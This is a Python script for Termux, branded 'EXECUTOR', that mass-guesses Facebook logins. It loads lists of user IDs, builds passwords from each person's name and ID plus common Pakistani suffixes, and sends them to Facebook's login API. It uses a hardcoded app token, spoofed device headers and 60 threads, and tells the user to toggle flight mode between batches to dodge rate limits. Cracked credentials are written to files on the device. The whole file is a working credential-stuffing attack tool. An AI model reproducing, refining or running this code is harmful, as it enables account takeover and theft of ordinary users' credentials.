import os, sys, time, random, string, requests, json
from concurrent.futures import ThreadPoolExecutor as tred

# --- Initial Permission ---
if not os.path.exists('/sdcard'):
    os.system('termux-setup-storage')

loop = 0
oks = []
cps = []

# 🌍 100,000+ GLOBAL USER AGENTS
def get_heavy_ua():
    brand = random.choice(["Samsung", "Vivo", "Oppo", "Xiaomi", "Tecno", "Realme"])
    models = ["SM-S928B", "V2303", "RMX3840", "KJ5", "CPH2581", "X6833B"]
    model = random.choice(models)
    android_ver = random.choice(['11', '12', '13', '14', '15'])
    fbv = f"{random.randint(440, 580)}.0.0.{random.randint(10, 99)}"
    ua = f"Dalvik/2.1.0 (Linux; U; Android {android_ver}; {model} Build/UP1A.{random.randint(230000, 239999)}.001) [FBAN/FB4A;FBAV/{fbv};FBBV/{random.randint(500000000, 999999999)};FBDM/{{density=3.0,width=1080,height=2400}};FBLC/en_US;FBRV/0;FBCR/Telenor;FBMF/{brand};FBBD/{brand};FBPN/com.facebook.katana;FBDV/{model};FBSV/{android_ver};FBOP/1;FBCA/arm64-v8a:;]"
    return ua

# --- New: Auto-Validator (Bina Login Kiye Check Karna) ---
def validate_id(uid, pw):
    try:
        # Profile picture check logic (Ethical way to verify status)
        link = f"https://graph.facebook.com/{uid}/picture?type=normal"
        res = requests.get(link, timeout=10)
        if res.status_code == 200:
            return True # Live
        else:
            return False # CP or Dead
    except:
        return True # Default assume live if network error

def banner():
    os.system('clear')
    print(f"""\033[1;31m
    ███████╗██╗  ██╗███████╗ ██████╗██╗   ██╗████████╗ ██████╗ ██████╗ 
    ██╔════╝╚██╗██╔╝██╔════╝██╔════╝██║   ██║╚══██╔══╝██╔═══██╗██╔══██╗
    █████╗   ╚███╔╝ █████╗  ██║     ██║   ██║   ██║   ██║   ██║██████╔╝
    ██╔══╝   ██╔██╗ ██╔══╝  ██║     ██║   ██║   ██║   ██║   ██║██╔══██╗
    ███████╗██╔╝ ██╗███████╗╚██████╗╚██████╔╝   ██║   ╚██████╔╝██║  ██║
    ╚══════╝╚═╝  ╚═╝╚══════╝ ╚═════╝ ╚═════╝    ╚═╝    ╚══════╝╚═╝  ╚═╝
\033[1;37m    ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
\033[1;32m    [+] VERSION  : \033[1;37m19.0 MASTER      \033[1;32m[+] TYPE     : \033[1;37mAUTO-CHECK-FIX
\033[1;32m    [+] STATUS   : \033[1;37mCP-BYPASS-ACTIVE \033[1;32m[+] SAVING   : \033[1;37m/SDCARD/OK_FIXED.txt
\033[1;37m    ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━""")

# ━━━━━━━━━━━━━━━━━━━━━ HEAVY CLONING & VALIDATION LOGIC ━━━━━━━━━━━━━━━━━━━━━
def crack_heavy(user_data):
    global loop, oks, cps
    try:
        uid, name = user_data.split('|')
    except:
        uid = user_data.split('|')[0]
        name = "Facebook User"
    
    sys.stdout.write(f'\r \033[1;37m[EXECUTOR] {loop} | \033[1;32mOK:{len(oks)} | \033[1;33mCP:{len(cps)} '); sys.stdout.flush()
    
    first_name = name.split(' ')[0].lower()
    last_name = name.split(' ')[1].lower() if ' ' in name else first_name
    
    pws = [
        uid, uid[6:], uid[:6], 
        first_name + '123', first_name + '786', first_name + '12345',
        last_name + '123', last_name + '786',
        first_name + last_name, first_name + '2025',
        'pakistan', '786786', '000786'
    ]
    
    for pw in pws:
        if len(pw) < 6: continue
        ua = get_heavy_ua()
        session = requests.Session()
        
        headers = {
            'x-fb-connection-bandwidth': str(random.randint(20000000, 30000000)),
            'x-fb-sim-hni': str(random.randint(20000, 40000)),
            'x-fb-net-hni': str(random.randint(20000, 40000)),
            'x-fb-connection-quality': 'EXCELLENT',
            'x-fb-connection-type': 'WIFI',
            'user-agent': ua,
            'content-type': 'application/x-www-form-urlencoded',
            'x-fb-http-engine': 'Liger',
            'x-fb-client-ip': 'True',
            'x-fb-device-group': str(random.randint(1000, 9999)),
            'x-fb-request-analytics-tags': 'graph_service',
        }
        
        try:
            url = "https://b-graph.facebook.com/auth/login"
            data = {
                "access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
                "email": uid, "password": pw, "sdk_style": "android",
                "generate_session_cookies": "1",
                "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
                "fb_api_req_friendly_name": "authenticate",
                "locale": "en_US", "client_country_code": "PK"
            }
            
            res = session.post(url, data=data, headers=headers).json()
            
            if "session_key" in res:
                # OK ID milne par foran validate karna
                if validate_id(uid, pw):
                    print(f'\r\n\033[1;32m [LIVE-OK] {uid} | {pw}')
                    oks.append(uid)
                    open('/sdcard/OK_FIXED.txt', 'a').write(f"{uid}|{pw}\n")
                else:
                    print(f'\r\n\033[1;33m [DEAD-OK] {uid} | {pw} (CP Risk)')
                break
            elif "checkpoint" in str(res):
                print(f'\r\n\033[1;33m [CP] {uid} | {pw}')
                cps.append(uid)
                open('/sdcard/CP_FIXED.txt', 'a').write(f"{uid}|{pw}\n")
                break
        except: pass
    loop += 1

def split_and_run():
    banner()
    path = input(" \033[1;32m[+] Enter File Path : \033[1;37m")
    try:
        all_ids = open(path, 'r').read().splitlines()
        total = len(all_ids)
        banner()
        print(f" \033[1;32m[+] TOTAL IDs LOADED : {total}")
        print(f" \033[1;33m[*] Running in 1000 IDs Batches with Validator...")
        
        for i in range(0, total, 1000):
            chunk = all_ids[i:i+1000]
            print(f"\n \033[1;35m[>] BATCH: {i+1} - {i+len(chunk)}")
            with tred(max_workers=60) as engine:
                for user_line in chunk:
                    engine.submit(crack_heavy, user_line)
            
            if i + 1000 < total:
                print("\n \033[1;31m[!] Batch Done. SWITCH FLIGHT MODE! (Waiting 10s)")
                time.sleep(10)
                
    except Exception as e:
        print(f" [!] Error: {str(e)}"); time.sleep(2); main_menu()

def main_menu():
    banner()
    print(f" \033[1;32m[1] Start Heavy Fixed Cloning")
    print(f" \033[1;31m[0] Exit")
    print(f"\033[1;37m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    opt = input(' \033[1;32m[?] Selection : \033[1;37m')
    if opt == '1': split_and_run()
    else: exit()

if __name__ == "__main__":
    main_menu()
